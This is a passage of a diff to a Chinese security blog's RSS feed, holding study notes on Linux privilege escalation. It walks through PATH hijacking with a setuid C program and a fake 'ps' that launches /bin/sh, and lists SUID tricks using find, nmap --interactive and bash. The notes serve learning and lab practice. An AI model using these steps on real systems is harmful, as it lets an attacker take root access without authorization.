-&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/youyoui/p/10680329.html&#34;&gt;Linux环境变量配置全攻略&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id=&#34;path&#34;&gt;$PATH&lt;/h3&gt;
-&lt;p&gt;&lt;code&gt;$PATH&lt;/code&gt;是Linux和类Unix操作系统中的环境变量，它指定了存储所有可执行程序的&lt;code&gt;bin&lt;/code&gt;和&lt;code&gt;sbin&lt;/code&gt;目录，各目录之间用冒号&lt;code&gt;:&lt;/code&gt;隔开。当执行某个命令时，Linux 会依照 PATH 中的目录&lt;strong&gt;依次&lt;/strong&gt;搜寻该命令的可执行文件，找到就执行，不然就报错。此外，超级用户通常还具有&lt;code&gt;/sbin&lt;/code&gt;和&lt;code&gt;/usr/sbin&lt;/code&gt;目录，以便轻松执行系统管理命令。&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;$PATH&lt;/code&gt;内容可通过&lt;code&gt;echo $PATH&lt;/code&gt;命令查看。&lt;/p&gt;
-&lt;h2 id=&#34;提权&#34;&gt;提权&lt;/h2&gt;
-&lt;p&gt;当我们将恶意二进制文件所在目录插入到PATH的第一个目录时，由于PATH提供了依次搜寻命令的目录地址，所以root执行命令就会优先执行我们插入目录下的二进制文件实现提权。&lt;/p&gt;
-&lt;p&gt;挑选一个目录&lt;code&gt;/tmp&lt;/code&gt;创建&lt;code&gt;test.c&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-    &lt;span class=&#34;n&#34;&gt;setuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// root UID
-&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;ps&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
-&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;root用户编译并赋予suid属性&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gcc test.c -o shell
-chmod +s shell
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;回到低权限用户，创建ps文件，写入要执行的命令并赋予执行权限&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt; &amp;gt; ps
-chmod +x ps
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;最后插入PATH目录&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/tmp:&lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;执行&lt;code&gt;./shell&lt;/code&gt;成功提权&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210526171137.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
-&lt;p&gt;进行PATH提权的前提就是能进行suid提权，所以需要先使用payload寻找suid文件，然后读取文件内容看是否有非绝对路径的命令，如root直接运行&lt;code&gt;chmod&lt;/code&gt;等。&lt;/p&gt;
-&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
-&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/2767&#34;&gt;Linux环境变量提权&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/youyoui/p/10680329.html&#34;&gt;Linux环境变量配置全攻略&lt;/a&gt;&lt;/p&gt;
-</description>
-                
-                
-                
-                
-                
-                    
-                        
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</category>
-                                
-                            
-                        
-                    
-                        
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/tags/linux/">Linux</category>
-                                
-                            
-                                
-                                
-                                
-                                    <category domain="https://tyskill.github.io/tags/%E6%8F%90%E6%9D%83/">提权</category>
                                 
                             
                         
@@ -1683,23 +1387,24 @@ run
             </item>
         
             <item>
-                <title>[Linux提权]suid提权</title>
-                <link>https://tyskill.github.io/posts/suid%E6%8F%90%E6%9D%83/</link>
-                <guid isPermaLink="true">https://tyskill.github.io/posts/suid%E6%8F%90%E6%9D%83/</guid>
+                <title>Linux提权学习记录</title>
+                <link>https://tyskill.github.io/posts/linux%E6%8F%90%E6%9D%83/</link>
+                <guid isPermaLink="true">https://tyskill.github.io/posts/linux%E6%8F%90%E6%9D%83/</guid>
                 <pubDate>Wed, 12 May 2021 00:00:00 &#43;0000</pubDate>
                 
                     <author>tyskill@foxmail.com (tyskill)</author>
                 
                 <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                 
-                    <description>&lt;h1 id=&#34;前置知识&#34;&gt;前置知识&lt;/h1&gt;
-&lt;h2 id=&#34;linux文件权限&#34;&gt;Linux文件权限&lt;/h2&gt;
+                    <description>&lt;h2 id=&#34;suid提权&#34;&gt;suid提权&lt;/h2&gt;
+&lt;h3 id=&#34;前置知识&#34;&gt;前置知识&lt;/h3&gt;
+&lt;h4 id=&#34;linux文件权限&#34;&gt;Linux文件权限&lt;/h4&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.runoob.com/linux/linux-file-attr-permission.html&#34;&gt;Linux 文件基本属性&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&#34;suid属性&#34;&gt;suid属性&lt;/h2&gt;
-&lt;h3 id=&#34;概述&#34;&gt;概述&lt;/h3&gt;
+&lt;h4 id=&#34;suid属性&#34;&gt;suid属性&lt;/h4&gt;
+&lt;h5 id=&#34;概述&#34;&gt;概述&lt;/h5&gt;
 &lt;p&gt;suid（也叫setuid，全称是Set owner User ID up on execution），是Linux中二进制可执行文件的执行权限属性。关于uid可以通过文章&lt;a href=&#34;https://www.cnblogs.com/limingluzhu/p/5702486.html&#34;&gt;Linux内核学习笔记： uid之ruid，euid，suid&lt;/a&gt;了解。&lt;/p&gt;
 &lt;p&gt;正常来说，RUID（真实用户ID）和EUID（有效用户ID）是一样的，但是当一个被设置了suid位的&lt;strong&gt;二进制可执行文件&lt;/strong&gt;运行时，它的RUID是当前执行文件用户的ID，而EUID是文件所有者的用户ID。根据&lt;strong&gt;RUID保存进程创建用户ID、EUID确定进程对系统资源访问权限&lt;/strong&gt;的作用，当前执行可执行文件的用户在&lt;strong&gt;文件运行时&lt;/strong&gt;可以拥有文件所有者的权限。&lt;/p&gt;
-&lt;h3 id=&#34;设置suid位&#34;&gt;设置suid位&lt;/h3&gt;
+&lt;h5 id=&#34;设置suid位&#34;&gt;设置suid位&lt;/h5&gt;
 &lt;p&gt;&lt;strong&gt;符号表示法&lt;/strong&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1725,15 +1430,15 @@ run
 &lt;span class=&#34;c1&#34;&gt;# sbit: 1&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
-&lt;h2 id=&#34;提权条件&#34;&gt;提权条件&lt;/h2&gt;
+&lt;/div&gt;&lt;h3 id=&#34;提权&#34;&gt;提权&lt;/h3&gt;
+&lt;h4 id=&#34;提权条件&#34;&gt;提权条件&lt;/h4&gt;
 &lt;p&gt;什么样的文件所有者才能实现suid提权？P神在他的&lt;a href=&#34;https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html&#34;&gt;文章&lt;/a&gt;中说明了&lt;strong&gt;只有这个程序的所有者是0号或其他super user，同时拥有suid权限，才可以提权&lt;/strong&gt;。也就是只有系统管理员（root用户或sudo命令的用户）加suid属性才能实现suid提权。&lt;/p&gt;
 &lt;p&gt;所以，suid提权条件应该是：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;文件所有者UID=0或其他superuser&lt;/li&gt;
 &lt;li&gt;文件所有者和当前用户都对二进制可执行文件有suid权限&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2 id=&#34;常见可利用文件&#34;&gt;常见可利用文件&lt;/h2&gt;
+&lt;h4 id=&#34;常见可利用文件&#34;&gt;常见可利用文件&lt;/h4&gt;
 &lt;p&gt;在实际应用时，我们不可能自己通过root用户去编译一个C去提权，因此拥有suid权限的可执行文件就显得非常必要。&lt;/p&gt;
 &lt;p&gt;寻找有suid权限的可执行文件payload&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -1749,7 +1454,7 @@ find / -user root -perm -4000 -exec ls -ldb &lt;span class=&#34;o&#34;&gt;{}&lt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;除此之外，常被提及的suid提权文件也能在实际使用时提供更为便捷的帮助，毕竟有目的的搜集比列一堆不知道啥玩意的要好得多。&lt;/p&gt;
-&lt;h3 id=&#34;nmap&#34;&gt;nmap&lt;/h3&gt;
+&lt;h5 id=&#34;nmap&#34;&gt;nmap&lt;/h5&gt;
 &lt;p&gt;&lt;code&gt;2.02~5.21&lt;/code&gt;版本的nmap存在交互模式，可以通过以下命令提权&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;nmap --interactive
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;5.20&lt;/code&gt;版本之后interactive模块被删除，之前的姿势就不能用了，有师傅提出了&lt;code&gt;5.20&lt;/code&gt;版本之后的加载自定义script可以提权，但是经过测试发现生成shell的权限取决于使用nmap的用户。&lt;/p&gt;
@@ -1775,7 +1480,7 @@ tyskill	ALL=(root) NOPASSWD: /usr/bin/nmap
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210513164237.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;并且我发现执行&lt;code&gt;sudo -l&lt;/code&gt;时也不需要进行密码验证，之前还怀疑是不是由于sudo验证过了所以执行&lt;code&gt;sudo -l&lt;/code&gt;时不用验证，原来设置了这个之后执行&lt;code&gt;sudo -l&lt;/code&gt;就不需要验证了&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h3 id=&#34;find&#34;&gt;find&lt;/h3&gt;
+&lt;h5 id=&#34;find&#34;&gt;find&lt;/h5&gt;
 &lt;p&gt;find可用来查找系统中指定文件，同时它也有执行命令的能力。&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1789,7 +1494,7 @@ touch tyskill
 find tyskill -exec whoami &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# ;不可少&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h3 id=&#34;bash&#34;&gt;bash&lt;/h3&gt;
+&lt;/div&gt;&lt;h5 id=&#34;bash&#34;&gt;bash&lt;/h5&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
@@ -1828,15 +1533,15 @@ find tyskill -exec whoami &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt; &lt;spa
 &lt;/div&gt;&lt;p&gt;编译执行id命令返回&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;用户id=0(root) 组id=1000(tyskill) 组=1000(tyskill)
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功提权。同理，Ubuntu的dash也可以这样绕过。&lt;/p&gt;
-&lt;h3 id=&#34;其他&#34;&gt;其他&lt;/h3&gt;
+&lt;h5 id=&#34;其他&#34;&gt;其他&lt;/h5&gt;
 &lt;blockquote&gt;
 &lt;p&gt;其他的诸如vim、less、nano都只是在当前用户上生成一个shell，可能是因为shell只是&lt;code&gt;/bin/sh&lt;/code&gt;起不到suid提权的效果，但是加了p参数甚至连shell都无法生成。因此这种提权还是需要上面提到的&lt;code&gt;/etc/sudoers&lt;/code&gt;配合无密码验证sudo执行，然后生成root权限的shell。&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;更多姿势可参考&lt;a href=&#34;https://www.secrss.com/articles/28493&#34;&gt;利用suid提权获取CentOS系统Root Shell&lt;/a&gt;&lt;/p&gt;
-&lt;h1 id=&#34;防御&#34;&gt;防御&lt;/h1&gt;
+&lt;h3 id=&#34;防御&#34;&gt;防御&lt;/h3&gt;
 &lt;p&gt;知其攻，接下来就是知其防了。看不懂，咕了吧，反正现在用不着&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.whonix.org/wiki/SUID_Disabler_and_Permission_Hardener&#34;&gt;SUID Disabler and Permission Hardener&lt;/a&gt;&lt;/p&gt;
-&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
+&lt;h3 id=&#34;参考&#34;&gt;参考&lt;/h3&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.runoob.com/linux/linux-file-attr-permission.html&#34;&gt;Linux 文件基本属性&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/fhefh/archive/2011/09/20/2182155.html&#34;&gt;linux：SUID、SGID详解&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/limingluzhu/p/5702486.html&#34;&gt;Linux内核学习笔记： uid之ruid，euid，suid&lt;/a&gt;&lt;/p&gt;
@@ -1845,6 +1550,72 @@ find tyskill -exec whoami &lt;span class=&#34;se&#34;&gt;\;&lt;/span&gt; &lt;spa
 &lt;p&gt;&lt;a href=&#34;https://jlkl.github.io/2020/01/27/Web_15/&#34;&gt;Linux SUID 提权&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.whonix.org/wiki/SUID_Disabler_and_Permission_Hardener&#34;&gt;SUID Disabler and Permission Hardener&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href=&#34;https://www.secrss.com/articles/28493&#34;&gt;利用suid提权获取CentOS系统Root Shell&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;path提权&#34;&gt;PATH提权&lt;/h2&gt;
+&lt;h3 id=&#34;前置知识-1&#34;&gt;前置知识&lt;/h3&gt;
+&lt;h4 id=&#34;linux环境变量&#34;&gt;Linux环境变量&lt;/h4&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/youyoui/p/10680329.html&#34;&gt;Linux环境变量配置全攻略&lt;/a&gt;&lt;/p&gt;
+&lt;h4 id=&#34;path&#34;&gt;$PATH&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;$PATH&lt;/code&gt;是Linux和类Unix操作系统中的环境变量，它指定了存储所有可执行程序的&lt;code&gt;bin&lt;/code&gt;和&lt;code&gt;sbin&lt;/code&gt;目录，各目录之间用冒号&lt;code&gt;:&lt;/code&gt;隔开。当执行某个命令时，Linux 会依照 PATH 中的目录&lt;strong&gt;依次&lt;/strong&gt;搜寻该命令的可执行文件，找到就执行，不然就报错。此外，超级用户通常还具有&lt;code&gt;/sbin&lt;/code&gt;和&lt;code&gt;/usr/sbin&lt;/code&gt;目录，以便轻松执行系统管理命令。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$PATH&lt;/code&gt;内容可通过&lt;code&gt;echo $PATH&lt;/code&gt;命令查看。&lt;/p&gt;
+&lt;h3 id=&#34;提权-1&#34;&gt;提权&lt;/h3&gt;
+&lt;p&gt;当我们将恶意二进制文件所在目录插入到PATH的第一个目录时，由于PATH提供了依次搜寻命令的目录地址，所以root执行命令就会优先执行我们插入目录下的二进制文件实现提权。&lt;/p&gt;
+&lt;p&gt;挑选一个目录&lt;code&gt;/tmp&lt;/code&gt;创建&lt;code&gt;test.c&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;setuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// root UID
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;ps&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;root用户编译并赋予suid属性&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gcc test.c -o shell
+chmod +s shell
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;回到低权限用户，创建ps文件，写入要执行的命令并赋予执行权限&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt; &amp;gt; ps
+chmod +x ps
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;最后插入PATH目录&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/tmp:&lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;执行&lt;code&gt;./shell&lt;/code&gt;成功提权&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210526171137.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
+&lt;p&gt;进行PATH提权的前提就是能进行suid提权，所以需要先使用payload寻找suid文件，然后读取文件内容看是否有非绝对路径的命令，如root直接运行&lt;code&gt;chmod&lt;/code&gt;等。&lt;/p&gt;
+&lt;h3 id=&#34;参考-1&#34;&gt;参考&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/2767&#34;&gt;Linux环境变量提权&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/youyoui/p/10680329.html&#34;&gt;Linux环境变量配置全攻略&lt;/a&gt;&lt;/p&gt;
 </description>
                 
                 
@@ -3581,15 +3352,15 @@ OLDPWD=/app
                 
                 <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                 
-                    <description>&lt;h1 id=&#34;前言&#34;&gt;前言&lt;/h1&gt;
+                    <description>&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
 &lt;p&gt;众所周知，文件包含常与&lt;code&gt;php://filter&lt;/code&gt;一起出现，虽然出现的多，但是payload的组合也就那么几种，所以我并没有怎么去了解过。不过最近在复现Laravel mode debug漏洞时phar反序列化RCE的姿势也用到了&lt;code&gt;php://filter&lt;/code&gt;且对其过滤器的作用需要有一定的理解，因此就诞生了这篇学习笔记。&lt;/p&gt;
-&lt;h1 id=&#34;介绍&#34;&gt;介绍&lt;/h1&gt;
+&lt;h2 id=&#34;介绍&#34;&gt;介绍&lt;/h2&gt;
 &lt;p&gt;引用&lt;a href=&#34;https://www.php.net/manual/zh/wrappers.php&#34;&gt;官方手册&lt;/a&gt;：&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&lt;code&gt;php://filter&lt;/code&gt; 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 &lt;code&gt;readfile()&lt;/code&gt;、 &lt;code&gt;file()&lt;/code&gt; 和 &lt;code&gt;file_get_contents()&lt;/code&gt;，在数据流内容读取之前没有机会应用其他过滤器。
 &lt;code&gt;php://filter&lt;/code&gt; 目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;h2 id=&#34;参数&#34;&gt;参数&lt;/h2&gt;
+&lt;h3 id=&#34;参数&#34;&gt;参数&lt;/h3&gt;
 &lt;table&gt;
 &lt;thead&gt;
